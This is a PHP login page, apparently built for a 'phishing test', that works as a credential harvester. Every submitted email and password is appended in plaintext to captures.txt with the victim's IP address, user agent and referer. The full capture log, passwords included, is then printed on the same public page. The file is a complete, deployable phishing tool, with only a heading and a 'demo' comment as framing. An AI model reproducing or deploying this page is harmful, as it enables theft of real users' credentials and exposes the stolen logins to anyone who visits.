<?php
// index.php

date_default_timezone_set('UTC');

function h($str) {
    return htmlspecialchars($str ?? '', ENT_QUOTES, 'UTF-8');
}

$submitted = ($_SERVER['REQUEST_METHOD'] === 'POST');
$email = '';
$password = '';

if ($submitted) {
    // Collect inputs
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    // Metadata
    $ts = gmdate('c');
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $ref = $_SERVER['HTTP_REFERER'] ?? '';

    // Prepare line
    $line = sprintf(
        "[%s] email=%s password=%s ua=%s ip=%s referer=%s\n",
        $ts,
        json_encode($email, JSON_UNESCAPED_SLASHES),
        json_encode($password, JSON_UNESCAPED_SLASHES),
        json_encode($ua, JSON_UNESCAPED_SLASHES),
        json_encode($ip, JSON_UNESCAPED_SLASHES),
        json_encode($ref, JSON_UNESCAPED_SLASHES)
    );

    // Write to captures.txt (same directory)
    $file = __DIR__ . '/captures.txt';
    @file_put_contents($file, $line, FILE_APPEND | LOCK_EX);

    // Clear password after logging
    $password = '';

    // Redirect after a successful login (for demo, we just stay here)
    $login_success = true;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Login</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 50px auto; }
        .container { width: 300px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; }
        button { padding: 10px; }
        .error { color: red; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Login to take phishing test</h2>

        <?php if ($submitted && !$login_success): ?>
            <div class="error">Incorrect email or password. Try again.</div>
        <?php endif; ?>

        <form method="post" action="">
            <input type="text" name="email" placeholder="Email" required value="<?php echo h($email); ?>" />
            <input type="password" name="password" placeholder="Password" required />
            <button type="submit">Log In</button>
        </form>
    </div>

    <h3>Log</h3>
    <pre><?php echo htmlspecialchars(file_get_contents('captures.txt')); ?></pre>
</body>
</html>
